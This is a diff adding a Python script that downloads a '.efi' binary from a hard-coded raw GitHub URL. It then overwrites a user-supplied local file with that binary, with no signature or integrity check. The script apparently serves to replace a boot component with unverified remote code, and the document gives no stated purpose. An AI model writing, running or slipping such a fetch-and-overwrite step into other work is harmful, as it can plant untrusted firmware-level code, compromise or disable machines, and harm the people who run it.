@@ -1,0 +1,25 @@
+import requests
+import sys
+
+def replace_local_file_with_remote_content(local_path: str, remote_url: str):
+    try:
+        print(f"Getting data from: {remote_url}")
+        resp = requests.get(remote_url)
+        resp.raise_for_status()
+
+        print(f"Rewriting file: {local_path}")
+        with open(local_path, 'wb') as f:
+            f.write(resp.content)  # сырые байты, без hex-декодирования
+
+        print("Success.")
+    except Exception as e:
+        print(f"Error: {e}", file=sys.stderr)
+        sys.exit(1)
+
+if __name__ == "__main__":
+    REMOTE_URL = "https://raw.githubusercontent.com/chCelera/baranyeban/refs/heads/main/mamkapapka.efi"
+    path = input("Path: ").strip()
+    if not path:
+        print("Path does not exist", file=sys.stderr)
+        sys.exit(1)
+    replace_local_file_with_remote_content(path, REMOTE_URL)
